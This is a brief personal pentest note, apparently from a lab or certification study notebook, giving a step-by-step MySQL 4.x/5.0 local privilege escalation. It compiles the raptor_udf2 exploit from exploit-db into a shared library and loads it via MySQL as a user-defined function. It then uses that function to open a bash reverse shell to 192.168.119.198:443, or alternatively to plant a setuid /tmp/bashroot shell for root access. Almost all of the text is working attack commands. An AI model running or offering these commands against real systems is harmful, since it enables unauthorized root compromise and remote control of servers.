TLDR: This local exploit seems to work on mysql 4.x/5.0. So check version and attempt if the stars align:)

I used this exploit: <https://www.exploit-db.com/exploits/1518>

nano raptor_udf2.c

copy paste the exploit in here.

Then we compile the exploit:

gcc -g -c raptor_udf2.c

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Then we log into mysql:

mysql -u root

use mysql;

create table foo(line blob);

insert into foo values(load_file('/home/j0hn/sss/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 
create function do_system returns integer soname 'raptor_udf2.so';
 
select * from mysql.func;
 
select do_system('bash -i >& /dev/tcp/192.168.119.198/443 0>&1');

/////

instead of the reverse shell, you can also do:

select do_system('cp /bin/sh /tmp/bashroot; chmod +s /tmp/bashroot');

exit

/tmp/bashroot -p

id

And we get a shell as root! Awesome!![unnamed_9a75d2630cc14e63922caa3165a340f5](docs/Attachments/Methodology/1.%20Enumeration/Other%20Services/3306/MySQL/MySQL%204.x_5.0%20local%20privesc/{{notename}}-202605011506.png)
